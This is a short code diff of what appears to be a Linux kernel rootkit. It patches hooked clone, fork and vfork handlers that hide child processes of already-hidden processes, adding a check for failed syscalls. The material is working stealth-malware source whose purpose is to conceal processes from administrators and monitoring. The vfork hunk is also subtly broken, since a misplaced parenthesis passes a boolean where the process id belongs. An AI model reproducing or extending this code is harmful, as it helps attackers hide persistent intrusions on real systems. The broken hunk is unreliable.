@@ -149,7 +149,7 @@ asmlinkage long rk_recvmsg(const struct pt_regs *pt_regs)
 asmlinkage long rk_clone(unsigned long a, unsigned long b, int __user *c, unsigned long d, int __user *e)
 {
     long i = orig_clone(a, b, c, d, e);
-    if (is_hidden_proc(current->pid))
+    if (is_hidden_proc(current->pid) && i != -1)
         hide_proc(i);
     // FM_INFO("clone from %d to %ld\n", current->pid, i);
     return i;
@@ -158,7 +158,7 @@ asmlinkage long rk_clone(unsigned long a, unsigned long b, int __user *c, unsign
 asmlinkage long rk_fork(const struct pt_regs *pt_regs)
 {
     long i = orig_fork(pt_regs);
-    if (is_hidden_proc(current->pid))
+    if (is_hidden_proc(current->pid) && i != -1)
         hide_proc(i);
     // FM_INFO("fork from %d to %ld\n", current->pid, i);
     return i;
@@ -167,7 +167,7 @@ asmlinkage long rk_fork(const struct pt_regs *pt_regs)
 asmlinkage long rk_vfork(const struct pt_regs *pt_regs)
 {
     long i = orig_vfork(pt_regs);
-    if (is_hidden_proc(current->pid))
+    if (is_hidden_proc(current->pid && i != -1))
         hide_proc(i);
     // FM_INFO("vfork from %d to %ld\n", current->pid, i);
     return i;
